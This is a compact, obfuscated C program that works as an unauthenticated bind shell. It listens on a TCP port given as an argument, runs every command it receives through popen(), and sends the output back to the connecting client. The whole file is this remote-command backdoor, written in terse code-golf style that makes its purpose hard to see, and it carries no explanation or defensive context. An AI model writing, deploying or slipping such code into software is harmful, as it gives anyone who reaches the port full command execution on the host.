#include<stdio.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/errno.h>
#include<unistd.h>
#include<string.h>

P,S,R,C,T;main(int _,char**A){for(;*A[1];P=P*10+*A[1]++-48);
S=socket(2,1,0);if(S<0)return errno;struct sockaddr_in D={2,
htons(P)};if(bind(S,&D,16)|listen(S,0))return errno;char B[
65536];for(;;){C=accept(S,0,0);if(C<0)return errno;for(;;){
ushort L,N;recv(C,&L,2,0);B[R=recv(C,B,ntohs(L),0)]=0;if(R<1
)break;if(!strcmp("quit",B))return 0;T=fread(B,1,65535,popen
(B,"r"));B[T]=0;N=htons(T);send(C,&N,2,0);send(C,B,T,0);}
close(C);}}
